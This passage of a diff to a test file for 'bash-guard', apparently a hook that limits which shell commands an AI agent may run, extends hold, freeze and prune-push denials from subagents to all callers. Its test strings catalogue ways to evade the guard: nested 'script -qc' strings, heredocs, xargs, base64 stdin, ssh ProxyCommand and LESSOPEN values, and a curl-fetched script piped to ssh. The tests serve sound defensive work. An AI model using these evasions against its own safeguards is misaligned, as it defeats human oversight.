-    "script -q /dev/null ./scripts/hold.ts rel* 1",
-    "script -q /dev/null ./scripts/hold.ts {release,list} 1",
-    'script -q /dev/null ./scripts/hold.ts "$(printf release)" 1',
-    "caffeinate ./scripts/freeze.ts $ACTION",
-    "caffeinate find . -name x -exec ./scripts/hold.ts \\;",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller whose subcommand behind a prefix cannot be read",
+  (subagent) => {
+    test.each([
+      "script -q /dev/null ./scripts/hold.ts $ACTION 1",
+      "script -q /dev/null ./scripts/hold.ts rel* 1",
+      "script -q /dev/null ./scripts/hold.ts {release,list} 1",
+      'script -q /dev/null ./scripts/hold.ts "$(printf release)" 1',
+      "caffeinate ./scripts/freeze.ts $ACTION",
+      "caffeinate find . -name x -exec ./scripts/hold.ts \\;",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // 前置きの後ろの凍結の`reset`と`push --prune`は、人の端末の確認を通る書き込みなので、subagentに許さない。
-describe("bash-guard denies a subagent that resets freezes or prunes a push", () => {
-  test.each([
-    "mise run freeze:reset",
-    "mise run push:prune",
-    "bun scripts/freeze.ts reset",
-    "bun scripts/freeze.ts push --prune",
-    "caffeinate mise run freeze:reset",
-    "caffeinate mise run push:prune",
-    "script -q /dev/null ./scripts/freeze.ts reset",
-    "script -q /dev/null ./scripts/freeze.ts push --prune",
-    "bun scripts/freeze.ts push $FLAGS",
-    "bun -e \"await Bun.spawn(['bun','scripts/freeze.ts','reset'])\"",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that resets freezes or prunes a push",
+  (subagent) => {
+    test.each([
+      "mise run freeze:reset",
+      "mise run push:prune",
+      "bun scripts/freeze.ts reset",
+      "bun scripts/freeze.ts push --prune",
+      "caffeinate mise run freeze:reset",
+      "caffeinate mise run push:prune",
+      "script -q /dev/null ./scripts/freeze.ts reset",
+      "script -q /dev/null ./scripts/freeze.ts push --prune",
+      "bun scripts/freeze.ts push $FLAGS",
+      "bun -e \"await Bun.spawn(['bun','scripts/freeze.ts','reset'])\"",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // `script -c`などのコマンド文字列は、中身をコマンドとして読んで判定する。
-describe("bash-guard denies a subagent that writes holds or freezes inside a command string", () => {
-  test.each([
-    `script -qc "bun scripts/hold.ts release 1" /dev/null`,
-    `script -qc "bun scripts/hold.ts release 1" bun`,
-    `script -qc "mise run freeze:release 1" /dev/null`,
-    `ssh host "mise run hold:release 1"`,
-    `script -qc "cat scripts/hold.ts | bun run -" /dev/null`,
-    `script -qc "bun run - < scripts/hold.ts" /dev/null`,
-    `script -qc "bun run - release 1" /dev/null < scripts/freeze.ts`,
-    `script -qc "bash -c 'mise run hold:release 1'" /dev/null`,
-    `script -qc "echo 'mise run hold:release 1' | sh" /dev/null`,
-    `script -qc 'echo "$X" | sh' /dev/null`,
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that writes holds or freezes inside a command string",
+  (subagent) => {
+    test.each([
+      `script -qc "bun scripts/hold.ts release 1" /dev/null`,
+      `script -qc "bun scripts/hold.ts release 1" bun`,
+      `script -qc "mise run freeze:release 1" /dev/null`,
+      `ssh host "mise run hold:release 1"`,
+      `script -qc "cat scripts/hold.ts | bun run -" /dev/null`,
+      `script -qc "bun run - < scripts/hold.ts" /dev/null`,
+      `script -qc "bun run - release 1" /dev/null < scripts/freeze.ts`,
+      `script -qc "bash -c 'mise run hold:release 1'" /dev/null`,
+      `script -qc "echo 'mise run hold:release 1' | sh" /dev/null`,
+      `script -qc 'echo "$X" | sh' /dev/null`,
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // 前置きの後ろのシェルが標準入力からコードを読む形は、標準入力の文字列を読んで判定する。読めなければ拒否する。
-describe("bash-guard denies a subagent that feeds a shell behind a prefix through its stdin", () => {
-  test.each([
-    "echo 'mise run hold:release 1' | script -q /dev/null sh",
-    "script -q /dev/null bash <<< 'mise run hold:release 1'",
-    "script -q /dev/null bash <<'EOF'\nmise run hold:release 1\nEOF",
-    "script -q /dev/null sh <<< 'bun scripts/freeze.ts release 1'",
-    'echo "$X" | script -q /dev/null sh',
-    "script -q /dev/null sh <<< 'mise run hold:release 1'; true",
-    "caffeinate -i sh <<< 'mise run hold:place'",
-    "script -q /dev/null <<< 'mise run hold:release 1'",
-    "script -q /dev/null <<'EOF'\nbun scripts/freeze.ts release 1\nEOF",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that feeds a shell behind a prefix through its stdin",
+  (subagent) => {
+    test.each([
+      "echo 'mise run hold:release 1' | script -q /dev/null sh",
+      "script -q /dev/null bash <<< 'mise run hold:release 1'",
+      "script -q /dev/null bash <<'EOF'\nmise run hold:release 1\nEOF",
+      "script -q /dev/null sh <<< 'bun scripts/freeze.ts release 1'",
+      'echo "$X" | script -q /dev/null sh',
+      "script -q /dev/null sh <<< 'mise run hold:release 1'; true",
+      "caffeinate -i sh <<< 'mise run hold:place'",
+      "script -q /dev/null <<< 'mise run hold:release 1'",
+      "script -q /dev/null <<'EOF'\nbun scripts/freeze.ts release 1\nEOF",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // 入れ子の深さの上限は4。上限の中は文字列を読み、超えた文字列は字面で判定する。
-describe("bash-guard reads command strings nested up to the limit for holds", () => {
-  test("denies a hold release inside a string nested four times", async () => {
-    expect(
-      await decide(nestedInScript("mise run hold:release 1", 4), {
-        subagent: true,
-      }),
-    ).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard reads command strings nested up to the limit for holds",
+  (subagent) => {
+    test("denies a hold release inside a string nested four times", async () => {
+      expect(
+        await decide(nestedInScript("mise run hold:release 1", 4), {
+          subagent,
+        }),
+      ).toBe("deny");
+    });
 
-  test("denies a hold release by its name inside a string nested six times", async () => {
-    expect(
-      await decide(nestedInScript("mise run hold:release 1", 6), {
-        subagent: true,
-      }),
-    ).toBe("deny");
-  });
+    test("denies a hold release by its name inside a string nested six times", async () => {
+      expect(
+        await decide(nestedInScript("mise run hold:release 1", 6), {
+          subagent,
+        }),
+      ).toBe("deny");
+    });
 
-  test("denies a string nested six times that only names the hold code", async () => {
-    expect(
-      await decide(nestedInScript("cat scripts/hold.ts", 6), {
-        subagent: true,
-      }),
-    ).toBe("deny");
-  });
+    test("denies a string nested six times that only names the hold code", async () => {
+      expect(
+        await decide(nestedInScript("cat scripts/hold.ts", 6), {
+          subagent,
+        }),
+      ).toBe("deny");
+    });
 
-  test("allows a string nested six times that names nothing", async () => {
-    expect(
-      await decide(nestedInScript("echo hello", 6), { subagent: true }),
-    ).toBe("allow");
-  });
+    test("allows a string nested six times that names nothing", async () => {
+      expect(await decide(nestedInScript("echo hello", 6), { subagent })).toBe(
+        "allow",
+      );
+    });
 
-  test("allows listing holds in shell strings nested seven times without a prefix", async () => {
-    expect(
-      await decide(nestedInBash("mise run hold:list", 7), { subagent: true }),
-    ).toBe("allow");
-  });
-});
+    test("allows listing holds in shell strings nested seven times without a prefix", async () => {
+      expect(
+        await decide(nestedInBash("mise run hold:list", 7), { subagent }),
+      ).toBe("allow");
+    });
+  },
+);
 
 // 前置きの後ろで調べる起動語の数の上限は16。超えたら、どの語を実行するか決められないので拒否する。
-describe("bash-guard caps the launcher words it reads behind a prefix", () => {
-  test("allows sixteen launcher words that run nothing", async () => {
-    expect(
-      await decide(`caffeinate ${"bun --version ".repeat(16)}`, {
-        subagent: true,
-      }),
-    ).toBe("allow");
-  });
+describeForCallers(
+  "bash-guard caps the launcher words it reads behind a prefix",
+  (subagent) => {
+    test("allows sixteen launcher words that run nothing", async () => {
+      expect(
+        await decide(`caffeinate ${"bun --version ".repeat(16)}`, {
+          subagent,
+        }),
+      ).toBe("allow");
+    });
 
-  test("denies seventeen launcher words", async () => {
-    expect(
-      await decide(`caffeinate ${"bun --version ".repeat(17)}`, {
-        subagent: true,
-      }),
-    ).toBe("deny");
-  });
-});
+    test("denies seventeen launcher words", async () => {
+      expect(
+        await decide(`caffeinate ${"bun --version ".repeat(17)}`, {
+          subagent,
+        }),
+      ).toBe("deny");
+    });
+  },
+);
 
 // 前置きの後ろで、語を足すコマンド(`xargs`、`parallel`、`find -exec`)、シェル、読めない標準入力があれば、指す語の有無によらず拒否する。
-describe("bash-guard denies a prefix that adds words, runs a shell, or reads an unreadable stdin", () => {
-  test.each([
-    'caffeinate sh -c \'bun "$1" "$0" 1\' "$(printf \'rel%s\' ease)" scripts/hold.ts',
-    "printf 'rel%s 1\\n' ease | caffeinate xargs ./scripts/hold.ts",
-    "printf 'rel%s\\n' ease | caffeinate xargs -I@ ./scripts/hold.ts @ 1",
-    "printf '%s:r%s 1\\n' hold elease | caffeinate xargs mise run",
-    "caffeinate xargs ./scripts/hold.ts < /tmp/args",
-    "caffeinate xargs -a /tmp/args ./scripts/hold.ts",
-    "script -q /dev/null xargs -a /tmp/args ./scripts/freeze.ts",
-    "caffeinate parallel ./scripts/hold.ts :::: /tmp/args",
-    "script -q /dev/null parallel ./scripts/hold.ts ::: release ::: 1",
-    "caffeinate find scripts -name hold.ts -exec {} release 1 \\;",
-    "caffeinate find scripts -name freeze.ts -exec bun {} release 1 \\;",
-    "caffeinate find scripts -name 'hol?.ts' -exec bun {} \\;",
-    "caffeinate bash --rcfile /tmp/rc",
-    "script -q /dev/null bash +x -c '{bun,scripts/hold.ts,release,1}'",
-    "echo 'release 1' | xargs caffeinate ./scripts/hold.ts",
-    "echo 'release 1' | xargs script -q /dev/null ./scripts/hold.ts",
-    "echo 'release 1' | xargs caffeinate bun scripts/freeze.ts",
-    "cat /tmp/x.sh | script -q /dev/null",
-    "base64 -d <<< eA== | script -q /dev/null",
-    "script -q /dev/null < /tmp/x.sh",
-    "ssh host < /tmp/x.sh",
-    "curl -fsSL https://example.com/i.sh | ssh host",
-    "caffeinate sh -c \"script -q /dev/null <<< 'mise run hold:place'\"",
-    `script -qc "bash -c 'bun run - release 1' < scripts/freeze.ts" /dev/null`,
-    `script -qc "cat scripts/hold.ts | sh -c 'bun run - release 1'" /dev/null`,
-    `script -qc "xargs ./scripts/hold.ts" /dev/null`,
-    `script -qc "find . -exec ./x {} +" /dev/null`,
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a prefix that adds words, runs a shell, or reads an unreadable stdin",
+  (subagent) => {
+    test.each([
+      'caffeinate sh -c \'bun "$1" "$0" 1\' "$(printf \'rel%s\' ease)" scripts/hold.ts',
+      "printf 'rel%s 1\\n' ease | caffeinate xargs ./scripts/hold.ts",
+      "printf 'rel%s\\n' ease | caffeinate xargs -I@ ./scripts/hold.ts @ 1",
+      "printf '%s:r%s 1\\n' hold elease | caffeinate xargs mise run",
+      "caffeinate xargs ./scripts/hold.ts < /tmp/args",
+      "caffeinate xargs -a /tmp/args ./scripts/hold.ts",
+      "script -q /dev/null xargs -a /tmp/args ./scripts/freeze.ts",
+      "caffeinate parallel ./scripts/hold.ts :::: /tmp/args",
+      "script -q /dev/null parallel ./scripts/hold.ts ::: release ::: 1",
+      "caffeinate find scripts -name hold.ts -exec {} release 1 \\;",
+      "caffeinate find scripts -name freeze.ts -exec bun {} release 1 \\;",
+      "caffeinate find scripts -name 'hol?.ts' -exec bun {} \\;",
+      "caffeinate bash --rcfile /tmp/rc",
+      "script -q /dev/null bash +x -c '{bun,scripts/hold.ts,release,1}'",
+      "echo 'release 1' | xargs caffeinate ./scripts/hold.ts",
+      "echo 'release 1' | xargs script -q /dev/null ./scripts/hold.ts",
+      "echo 'release 1' | xargs caffeinate bun scripts/freeze.ts",
+      "cat /tmp/x.sh | script -q /dev/null",
+      "base64 -d <<< eA== | script -q /dev/null",
+      "script -q /dev/null < /tmp/x.sh",
+      "ssh host < /tmp/x.sh",
+      "curl -fsSL https://example.com/i.sh | ssh host",
+      "caffeinate sh -c \"script -q /dev/null <<< 'mise run hold:place'\"",
+      `script -qc "bash -c 'bun run - release 1' < scripts/freeze.ts" /dev/null`,
+      `script -qc "cat scripts/hold.ts | sh -c 'bun run - release 1'" /dev/null`,
+      `script -qc "xargs ./scripts/hold.ts" /dev/null`,
+      `script -qc "find . -exec ./x {} +" /dev/null`,
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // 前置きの後ろの標準入力の文字列は、最上位でも入れ子でも同じ規則で判定する。
-describe("bash-guard reads the stdin text behind a prefix", () => {
-  test.each([
-    "script -q /dev/null <<< 'mise run push -- --prune'",
-    "script -q /dev/null <<< 'mise run \"h*:release\" -- 1'",
-    "echo \"mise run 'h*:release' -- 1\" | script -q /dev/null",
-    "echo './scripts/hold.ts release 1' | script -q /dev/null",
-    "caffeinate python3 - <<'EOF'\nsubprocess.run(['hold.ts', 'release'\nEOF",
-    `script -qc "script -q /dev/null <<< 'mise run push -- --prune'" /dev/null`,
-  ])("denies %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard reads the stdin text behind a prefix",
+  (subagent) => {
+    test.each([
+      "script -q /dev/null <<< 'mise run push -- --prune'",
+      "script -q /dev/null <<< 'mise run \"h*:release\" -- 1'",
+      "echo \"mise run 'h*:release' -- 1\" | script -q /dev/null",
+      "echo './scripts/hold.ts release 1' | script -q /dev/null",
+      "caffeinate python3 - <<'EOF'\nsubprocess.run(['hold.ts', 'release'\nEOF",
+      `script -qc "script -q /dev/null <<< 'mise run push -- --prune'" /dev/null`,
+    ])("denies %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("allows a stdin text that only reads the hold code", async () => {
-    expect(
-      await decide("echo 'cat scripts/hold.ts' | script -q /dev/null", {
-        subagent: true,
-      }),
-    ).toBe("allow");
-  });
+    test("allows a stdin text that only reads the hold code", async () => {
+      expect(
+        await decide("echo 'cat scripts/hold.ts' | script -q /dev/null", {
+          subagent,
+        }),
+      ).toBe("allow");
+    });
 
-  test("allows a stdin text that only lists the holds", async () => {
-    expect(
-      await decide("script -q /dev/null <<< 'mise run hold:list'", {
-        subagent: true,
-      }),
-    ).toBe("allow");
-  });
-});
+    test("allows a stdin text that only lists the holds", async () => {
+      expect(
+        await decide("script -q /dev/null <<< 'mise run hold:list'", {
+          subagent,
+        }),
+      ).toBe("allow");
+    });
+  },
+);
 
 // 深さの上限を超えた文字列と、読めない文字列は、字面で判定する。書き込みのタスク名と、`push`と`--prune`が並ぶ字面も拒否する。
-describe("bash-guard reads the wording of strings it cannot parse", () => {
-  const DEEP = "$(".repeat(9).concat("true", ")".repeat(9));
+describeForCallers(
+  "bash-guard reads the wording of strings it cannot parse",
+  (subagent) => {
+    const DEEP = "$(".repeat(9).concat("true", ")".repeat(9));
 
-  test("denies a push task name after a substitution nested nine times", async () => {
-    expect(
-      await decide(`script -qc '${DEEP}; mise run push:prune' /dev/null`, {
-        subagent: true,
-      }),
-    ).toBe("deny");
-  });
+    test("denies a push task name after a substitution nested nine times", async () => {
+      expect(
+        await decide(`script -qc '${DEEP}; mise run push:prune' /dev/null`, {
+          subagent,
+        }),
+      ).toBe("deny");
+    });
 
-  test("denies a push task name in a string nested five times", async () => {
-    expect(
-      await decide(nestedInScript("mise run push:prune", 5), {
-        subagent: true,
-      }),
-    ).toBe("deny");
-  });
+    test("denies a push task name in a string nested five times", async () => {
+      expect(
+        await decide(nestedInScript("mise run push:prune", 5), {
+          subagent,
+        }),
+      ).toBe("deny");
+    });
 
-  test("denies push with the prune option in a string nested five times", async () => {
-    expect(
-      await decide(nestedInScript("mise run push -- --prune", 5), {
-        subagent: true,
-      }),
-    ).toBe("deny");
-  });
+    test("denies push with the prune option in a string nested five times", async () => {
+      expect(
+        await decide(nestedInScript("mise run push -- --prune", 5), {
+          subagent,
+        }),
+      ).toBe("deny");
+    });
 
-  test("allows a dry-run push in a string nested five times", async () => {
-    expect(
-      await decide(nestedInScript("mise run push:dry", 5), { subagent: true }),
-    ).toBe("allow");
-  });
-});
+    test("allows a dry-run push in a string nested five times", async () => {
+      expect(
+        await decide(nestedInScript("mise run push:dry", 5), { subagent }),
+      ).toBe("allow");
+    });
+  },
+);
 
 // 前置きの後ろの文字列の中の、パスの形の語だけを読む道具は、パスの形でない語があれば別のコマンドを実行しうる。
-describe("bash-guard reads path-only reading tools inside a string behind a prefix", () => {
-  test.each([
-    `script -qc "sed -n '1e ./scripts/hold.ts release 1' README.md" /dev/null`,
-    `script -qc "bat --paging=always --pager './scripts/hold.ts release 1' README.md" /dev/null`,
-  ])("denies %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard reads path-only reading tools inside a string behind a prefix",
+  (subagent) => {
+    test.each([
+      `script -qc "sed -n '1e ./scripts/hold.ts release 1' README.md" /dev/null`,
+      `script -qc "bat --paging=always --pager './scripts/hold.ts release 1' README.md" /dev/null`,
+    ])("denies %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("allows sed that prints lines of the hold code inside a string", async () => {
-    expect(
-      await decide(`script -qc "sed -n 1,5p scripts/hold.ts" /dev/null`, {
-        subagent: true,
-      }),
-    ).toBe("allow");
-  });
-});
+    test("allows sed that prints lines of the hold code inside a string", async () => {
+      expect(
+        await decide(`script -qc "sed -n 1,5p scripts/hold.ts" /dev/null`, {
+          subagent,
+        }),
+      ).toBe("allow");
+    });
+  },
+);
 
 // `mise run push`は、`--prune`を付けると削除を確定する押し出しになる。
-describe("bash-guard reads the prune option of the push task", () => {
-  test.each([
-    "mise run push -- --prune",
-    "mise run push --prune",
-    "mise push --prune",
-    "caffeinate mise run push -- --prune",
-    "mise run push -- $FLAGS",
-    "mise run pu* -- --prune",
-  ])("denies %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard reads the prune option of the push task",
+  (subagent) => {
+    test.each([
+      "mise run push -- --prune",
+      "mise run push --prune",
+      "mise push --prune",
+      "caffeinate mise run push -- --prune",
+      "mise run push -- $FLAGS",
+      "mise run pu* -- --prune",
+    ])("denies %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test.each([
-    "mise run push",
-    "mise run push:dry",
-    "mise run push -- --dry-run",
-    "mise push",
-  ])("allows %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+    test.each([
+      "mise run push",
+      "mise run push:dry",
+      "mise run push -- --dry-run",
+      "mise push",
+    ])("allows %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
 // 1行に並ぶ数千の語やコマンドでも、フックのタイムアウト(10秒)の中で終える。
-describe("bash-guard finishes long hold input in time", () => {
-  test("finishes thousands of words that point at the hold code behind a prefix", async () => {
-    const started = Date.now();
-    await decide(`script -q /dev/null ${"scripts/hold.ts a ".repeat(3000)}`, {
-      subagent: true,
+describeForCallers(
+  "bash-guard finishes long hold input in time",
+  (subagent) => {
+    test("finishes thousands of words that point at the hold code behind a prefix", async () => {
+      const started = Date.now();
+      await decide(`script -q /dev/null ${"scripts/hold.ts a ".repeat(3000)}`, {
+        subagent,
+      });
+      expect(Date.now() - started).toBeLessThan(3000);
     });
-    expect(Date.now() - started).toBeLessThan(3000);
-  });
 
-  test("finishes thousands of commands that nest -c strings", async () => {
-    const started = Date.now();
-    await decide(`${`bash -c "bash -c 'echo a b'"; `.repeat(3000)}true`, {
-      subagent: true,
+    test("finishes thousands of commands that nest -c strings", async () => {
+      const started = Date.now();
+      await decide(`${`bash -c "bash -c 'echo a b'"; `.repeat(3000)}true`, {
+        subagent,
+      });
+      expect(Date.now() - started).toBeLessThan(3000);
     });
-    expect(Date.now() - started).toBeLessThan(3000);
-  });
 
-  test("finishes thousands of prefixed commands that nest strings", async () => {
-    const started = Date.now();
-    await decide(
-      `${`script -qc "script -qc 'echo a b' /dev/null" /dev/null; `.repeat(3000)}true`,
-      { subagent: true },
-    );
-    expect(Date.now() - started).toBeLessThan(3000);
-  });
-});
+    test("finishes thousands of prefixed commands that nest strings", async () => {
+      const started = Date.now();
+      await decide(
+        `${`script -qc "script -qc 'echo a b' /dev/null" /dev/null; `.repeat(3000)}true`,
+        { subagent },
+      );
+      expect(Date.now() - started).toBeLessThan(3000);
+    });
+  },
+);
 
 // 前置きの後ろでも、読み取りと検査と一覧、スケジュールの凍結、`list`付きのCLIは止めない。
-describe("bash-guard allows a subagent to work on the hold code behind a prefix", () => {
-  test.each([
-    "script -q /dev/null mise run hold:list",
-    "caffeinate bun scripts/hold.ts list",
-    "caffeinate mise run freeze:place -- --target a/b",
-    "caffeinate mise run freeze:place -- --target a/b --minutes 5 --reason x",
-    "caffeinate ./scripts/freeze.ts list --scope deploy",
-    "caffeinate ./scripts/freeze.ts check",
-    "caffeinate bun scripts/freeze.ts push --dry-run",
-    "caffeinate mise run push:dry",
-    "script -q /dev/null vim scripts/hold.ts",
-    "script -q /dev/null cat scripts/hold.ts",
-    "caffeinate git log -- scripts/hold.ts",
-    "caffeinate bunx biome check scripts/hold.ts",
-    "caffeinate bunx biome check scripts/hold.ts docs/release.md",
-    "caffeinate bun test tests/scripts/hold.test.ts",
-    `script -qc "cat scripts/hold.ts" /dev/null`,
-    `script -qc "rg -n release scripts/hold.ts" /dev/null`,
-    "ssh host 'cd /repo && mise run hold:list'",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
+describeForCallers(
+  "bash-guard allows a caller to work on the hold code behind a prefix",
+  (subagent) => {
+    test.each([
+      "script -q /dev/null mise run hold:list",
+      "caffeinate bun scripts/hold.ts list",
+      "caffeinate mise run freeze:place -- --target a/b",
+      "caffeinate mise run freeze:place -- --target a/b --minutes 5 --reason x",
+      "caffeinate ./scripts/freeze.ts list --scope deploy",
+      "caffeinate ./scripts/freeze.ts check",
+      "caffeinate bun scripts/freeze.ts push --dry-run",
+      "caffeinate mise run push:dry",
+      "script -q /dev/null vim scripts/hold.ts",
+      "script -q /dev/null cat scripts/hold.ts",
+      "caffeinate git log -- scripts/hold.ts",
+      "caffeinate bunx biome check scripts/hold.ts",
+      "caffeinate bunx biome check scripts/hold.ts docs/release.md",
+      "caffeinate bun test tests/scripts/hold.test.ts",
+      `script -qc "cat scripts/hold.ts" /dev/null`,
+      `script -qc "rg -n release scripts/hold.ts" /dev/null`,
+      "ssh host 'cd /repo && mise run hold:list'",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
 
-  test("allows a commit message that names a hold task without a prefix", async () => {
-    expect(
-      await decide('git commit -m "docs: mise run hold:release の注意"', {
-        subagent: true,
-      }),
-    ).toBe("allow");
-  });
-});
+    test("allows a commit message that names a hold task without a prefix", async () => {
+      expect(
+        await decide('git commit -m "docs: mise run hold:release の注意"', {
+          subagent,
+        }),
+      ).toBe("allow");
+    });
+  },
+);
 
 // 前置きの無い形は、語を足す文脈と代入の値を除いて、前置きの規則に入れない。
 // 先頭が前置きでないコマンドは、保留と凍結の判定の対象にならない。シェルとインタプリタの文字列は、別の変更で止める。
-describe("bash-guard leaves forms without a prefix as they were", () => {
-  test.each([
-    "vim scripts/hold.ts",
-    "chmod +x scripts/hold.ts",
-    "sed -i 's/a/b/' scripts/hold.ts",
-    "sed -n 1,5p scripts/hold.ts",
-    "find scripts -name hold.ts -exec cat {} \\;",
-    "find scripts -name hold.ts -exec head -n 3 {} \\;",
-    "bash ./x.sh",
-    "bash -c 'cat scripts/hold.ts'",
-    "echo 'release 1' | xargs cat scripts/hold.ts",
-    "python3 - <<'EOF'\nprint(\"hold on\")\nEOF",
-    "echo scripts/hold.ts | pbcopy",
-    "GIT_PAGER=cat git log",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+describeForCallers(
+  "bash-guard leaves forms without a prefix as they were",
+  (subagent) => {
+    test.each([
+      "vim scripts/hold.ts",
+      "chmod +x scripts/hold.ts",
+      "sed -i 's/a/b/' scripts/hold.ts",
+      "sed -n 1,5p scripts/hold.ts",
+      "find scripts -name hold.ts -exec cat {} \\;",
+      "find scripts -name hold.ts -exec head -n 3 {} \\;",
+      "bash ./x.sh",
+      "bash -c 'cat scripts/hold.ts'",
+      "echo 'release 1' | xargs cat scripts/hold.ts",
+      "python3 - <<'EOF'\nprint(\"hold on\")\nEOF",
+      "echo scripts/hold.ts | pbcopy",
+      "GIT_PAGER=cat git log",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
 // 前置きの後ろで、語を足す形、シェル、指す語と書き込みの語が並ぶ形は、実行と区別できないので拒否する。
-describe("bash-guard denies a subagent whose arguments carry a hold command behind a prefix", () => {
-  test.each([
-    "script -q /dev/null rg -n bun scripts/hold.ts",
-    'script -q /dev/null git commit -m "docs: mise run hold:release の注意"',
-    "caffeinate sh -c 'cat scripts/hold.ts'",
-    "caffeinate xargs grep -l x",
-    "script -q /dev/null bash ./x.sh",
-    'caffeinate git commit -m "docs: hold.ts release の注意"',
-    "caffeinate git log --grep release -- scripts/hold.ts",
-    "caffeinate tee notes.md <<'EOF'\nhold release\nEOF",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller whose arguments carry a hold command behind a prefix",
+  (subagent) => {
+    test.each([
+      "script -q /dev/null rg -n bun scripts/hold.ts",
+      'script -q /dev/null git commit -m "docs: mise run hold:release の注意"',
+      "caffeinate sh -c 'cat scripts/hold.ts'",
+      "caffeinate xargs grep -l x",
+      "script -q /dev/null bash ./x.sh",
+      'caffeinate git commit -m "docs: hold.ts release の注意"',
+      "caffeinate git log --grep release -- scripts/hold.ts",
+      "caffeinate tee notes.md <<'EOF'\nhold release\nEOF",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // 判定が変わるのはsubagentだけである。主セッションは、前置きの有無によらず今までどおり実行できる。
-describe("bash-guard leaves the main session free to run holds behind a prefix", () => {
-  test.each([
-    "script -q /dev/null mise run hold:release 1",
-    "caffeinate bun scripts/freeze.ts release 1",
-    "script -q /dev/null ./scripts/hold.ts release 1",
-    `script -qc "bun scripts/hold.ts release 1" /dev/null`,
-    "caffeinate sh -c 'cat scripts/hold.ts'",
-    "mise run freeze:reset",
-    "mise run push:prune",
-    "bun scripts/freeze.ts push --prune",
-    "GIT_PAGER='mise run hold:release 1' git log",
-  ])("%s", async (command) => {
-    expect(await decide(command)).toBe("allow");
-  });
-});
-
 // 前置きの後ろの文字列の中でも、前置きの`xargs`が足す語は読めない。先頭が`mise`や凍結のCLIでも拒否する。
-describe("bash-guard denies xargs inside a string behind a prefix", () => {
-  test.each([
-    `ssh host "printf 'hold:release 1' | xargs mise run"`,
-    `ssh host "echo release | xargs ./scripts/freeze.ts"`,
-    `script -qc "printf 'hold:release 1' | xargs mise run" /dev/null`,
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies xargs inside a string behind a prefix",
+  (subagent) => {
+    test.each([
+      `ssh host "printf 'hold:release 1' | xargs mise run"`,
+      `ssh host "echo release | xargs ./scripts/freeze.ts"`,
+      `script -qc "printf 'hold:release 1' | xargs mise run" /dev/null`,
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // 文字列の中の先頭の変数代入は前置きとして外れるが、値がコマンドとして実行されうる。値も先頭の語として判定する。
-describe("bash-guard reads the value of an assignment inside a string behind a prefix", () => {
-  test.each([
-    "ssh -o 'ProxyCommand=./scripts/hold.ts release 1' x",
-    "ssh -o 'ProxyCommand=./scripts/freeze.ts reset' x",
-    "ssh -o 'ProxyCommand=./scripts/freeze.ts release' x",
-    `ssh h "LESSOPEN='|./scripts/hold.ts release 1 %s' less f"`,
-  ])("denies %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard reads the value of an assignment inside a string behind a prefix",
+  (subagent) => {
+    test.each([
+      "ssh -o 'ProxyCommand=./scripts/hold.ts release 1' x",
+      "ssh -o 'ProxyCommand=./scripts/freeze.ts reset' x",
+      "ssh -o 'ProxyCommand=./scripts/freeze.ts release' x",
+      `ssh h "LESSOPEN='|./scripts/hold.ts release 1 %s' less f"`,
+    ])("denies %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("allows an assignment that only sets a number", async () => {
-    expect(await decide("ssh h 'FOO=1 bun test'", { subagent: true })).toBe(
-      "allow",
-    );
-  });
-});
+    test("allows an assignment that only sets a number", async () => {
+      expect(await decide("ssh h 'FOO=1 bun test'", { subagent })).toBe(
+        "allow",
+      );
+    });
+  },
+);
 
 // 前置きの後ろの`docker`と`psql`は、保留の表を直接書きうる。語か標準入力の文字列に`holds`があれば拒否する。
-describe("bash-guard reads docker and psql behind a prefix", () => {
-  test.each([
-    "caffeinate psql -c 'delete from holds'",
-    "caffeinate docker compose exec db psql -c 'update holds set x = 1'",
-    "echo 'delete from holds' | caffeinate psql",
